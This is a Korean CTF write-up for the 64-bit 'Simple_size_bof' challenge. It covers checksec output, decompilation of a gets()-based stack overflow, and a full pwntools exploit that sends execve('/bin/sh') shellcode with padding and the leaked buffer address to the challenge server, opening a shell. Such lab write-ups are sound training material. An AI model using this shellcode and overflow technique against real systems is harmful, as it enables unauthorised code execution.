# x64 Simple_size_BOF

```c
kimdong@ubuntu  ~/Wargame  file Simple_size_bof
Simple_size_bof: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=a18d2a384c8eed43683ec7a072dc350755fc72fb, not stripped
```

```c
kimdong@ubuntu  ~/Wargame  checksec Simple_size_bof
[*] '/home/kimdong/Wargame/Simple_size_bof'
   Arch:     amd64-64-little
   RELRO:    Partial RELRO
   Stack:    No canary found
   NX:       NX disabled
   PIE:      No PIE (0x400000)
   RWX:      Has RWX segments
kimdong@ubuntu  ~/Wargame 
```
이번 바이너리 파일은 64bit로 `Partial RELRO`외에는 적용된 보호기법이 없다.<br>

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+0h] [rbp-6D30h]

  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts(&s);
  printf("buf: %p\n", &v4);
  gets(&v4);
  return 0;
}
```
ida로 분석해보면, 문자열을 출력하고, buf의 주소를 출력해준다.<br>
그후에 `gets`를 통해 사용자의 입력값을 받는데, 검증하지 않아서, bof취약점이 가능할것으로 보인다.<br>

```c
kimdong@ubuntu  ~/Wargame  ./Simple_size_bof
삐빅- 자살방지 문제입니다.
buf: 0x7ffeb6280d50
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```
실행해보면, 예상대로 출력-출력-입력의 순서대로 진행된다.<br>
v4의 주소는 `rbp-6D30`부터 시작한다.<br>
따라서, main문의 return주소를 shellcode로 덮어씌워주면 문제가 해결가능할것으로 보인다.<br>
따라서, dummy의 값은 `0x6D30+0x8(SFP)-0x17(shellcode)` 그리고 shellcode를 입력해주면 될것같다.<br>

---

## Exploit Code
```c
from pwn import *

p = remote("ctf.j0n9hyun.xyz",3005)

p.recvuntil("buf: ")
buf_addr = int(p.recv(14), 16)


payload = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
payload += "A"*(27937)
payload += p64(buf_addr)

p.sendline(payload)

p.interactive()
```


```c
kimdong@ubuntu  ~/Wargame  python size_bof_ex.py
[+] Opening connection to ctf.j0n9hyun.xyz on port 3005: Done
[*] Switching to interactive mode

$ ls
flag
main
$ cat flag
HackCTF{}
```

## END !
